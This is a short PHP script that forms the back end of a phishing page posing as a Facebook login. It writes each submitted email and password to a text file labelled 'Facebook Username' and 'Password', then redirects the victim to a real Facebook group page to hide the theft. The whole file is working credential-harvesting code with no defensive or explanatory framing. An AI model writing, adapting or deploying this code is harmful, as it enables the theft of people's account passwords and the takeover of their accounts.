<?php 
file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . "\nPassword: " . $_POST['pass'] ."\n", FILE_APPEND);
header('Location: https://facebook.com/groups/550111620182893/');
exit();
?>